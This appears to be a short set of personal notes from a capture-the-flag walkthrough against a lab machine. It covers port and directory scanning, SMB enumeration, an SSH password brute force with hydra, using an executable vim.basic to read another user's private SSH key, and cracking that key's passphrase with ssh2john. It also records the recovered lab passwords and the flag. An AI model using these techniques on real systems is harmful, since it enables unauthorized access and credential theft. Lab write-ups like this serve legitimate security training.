Ip = 10.10.217.94






# `nmap -A 10.10.217.94`

![[Pasted image 20220603063538.png]]

## Ports [
	22/tcp
	80/tcp   SMB
	139/tcp  SMB
	445/tcp
	8009/tcp  ajp137
	8080/tcp  http-proxy
	
]


# `gobuster dir -u http://10.10.217.94/ -w common.txt`


![[Pasted image 20220603064312.png]] 

## Directories and Files [# Apache10.10.217.94 Tomcat/9.0.7
	.hta
	.htaccess
	.htpasswd
	development
	index.html
	server-status

]


Found content in development directory

![[Pasted image 20220603064529.png]]



## Dev.txt
![[Pasted image 20220603064627.png]]

## j.txt

![[Pasted image 20220603064657.png]]



## Points [
	SMB 
	Weak credentials
	Apache Struts Rest 2.5.12 [https://www.exploit-db.com/exploits/42627] 
	

]



## http://10.10.217.94:8080 

![[Pasted image 20220603065441.png]]

Appears to be a default Tomcat install 






## SMB enumeration

![[Pasted image 20220603070549.png]]

![[Pasted image 20220603070745.png]]

![[Pasted image 20220603070829.png]]


Found `staff.txt `in open SMB share


## Users [
	Kay
	Jan
	
]


## Bruteforced ssh with hydra [
	password:  armando
	
]



![[Pasted image 20220603181051.png]]

`/etc/shadow `is unwriteable

However `/usr/bin/vim.basic` (which is owned by root) is executable

![[Pasted image 20220603181247.png]]

by running `vim.basic /home/kay.ssh/id_rsa` we get kays private key


Unfortunately the private key has a password on it


We are able to convert this password into something crackable using `ssh2john`


![[Pasted image 20220603211130.png]]


![[Pasted image 20220603211033.png]]



I am now able to login to kays account with the private key password beeswax and retrieve the flag



flag = `heresareallystrongpasswordthatfollowsthepasswordpolicy$$
`